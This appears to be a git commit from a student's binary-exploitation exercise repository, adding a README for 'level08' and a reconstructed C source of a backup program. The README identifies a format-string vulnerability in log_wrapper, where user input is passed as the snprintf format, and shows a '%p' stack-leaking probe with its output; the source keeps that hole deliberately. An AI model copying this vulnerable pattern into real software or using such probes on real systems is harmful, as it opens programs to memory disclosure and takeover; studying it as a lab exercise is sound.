0b43dbdaf643216216d04c8ed461886878ebc29b
benjamin <besellem@student.42.com>
2022-08-02 17:05:41 +0200

    level08 source & in process

--- level08/Ressources/README.md
+++ level08/Ressources/README.md
@@ -1,1 +1,12 @@
 # level08
+
+As we can see in `log_wrapper`, the format of `snprintf()` is a variable, creating a vulnerability.  
+
+```sh
+$> ./level08 "$(python -c 'print("AAAAAAAA" + "%p "*100)')"
+
+$> cat backups/.log 
+LOG: Starting back up: AAAAAAAA0xffffffffffffffec 0xec 0x400d6c 0xffffffffffffffff 0x7fffffffe7ba 0x400d96 0x603010 0x676e697472617453 0x7075206b63616220 0x414141414141203a 0x6666666678304141 0x6666666666666666 0x6578302063656666 0x6430303478302063 0x6666667
+```
+*Our `'A's` are on the 10th position on the stack.*
+
---
+++ level08/source.c
@@ -0,0 +1,70 @@
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void	log_wrapper(FILE *stream, char *msg, char *fmt)
+{
+	char	buffer[264];
+
+	strcpy(buffer, msg);
+	snprintf(buffer + strlen(buffer), 254 - strlen(buffer), fmt);
+	buffer[strcspn(buffer, "\n")] = '\0';
+	fprintf(stream, "LOG: %s\n", buffer);
+}
+
+int		main(int argc, char **argv)
+{
+	char	*backup_path = "./backups/";
+	FILE	*log_file;
+	FILE	*input_file;
+	int		fd;
+	char	c;
+
+	if (argc != 2)
+	{
+		printf("Usage: %s filename\n", *argv);
+	}
+
+	log_file = fopen("./backups/.log", "w");
+	if (!log_file)
+	{
+		printf("ERROR: Failed to open %s\n", "./backups/.log");
+		exit(1);
+	}
+
+	log_wrapper(log_file, "Starting back up: ", argv[1]);
+	
+	input_file = fopen(argv[1], "r");
+	if (!input_file)
+	{
+		printf("ERROR: Failed to open %s\n", argv[1]);
+		exit(1);
+	}
+	
+	
+	strncat(backup_path, argv[1], 99 - strlen(backup_path));
+
+	fd = open(backup_path, 0xc1, 0x1b0);
+	if (fd < 0)
+	{
+		printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
+		exit(1);
+	}
+
+	while (1)
+	{
+		c = fgetc(input_file);
+		if (c == EOF)
+			break;
+		write(fd, &c, 1);
+	}
+
+	log_wrapper(log_file, "Finished back up ", argv[1]);
+	
+	fclose(input_file);
+	close(fd);
+
+	return 0;
+}
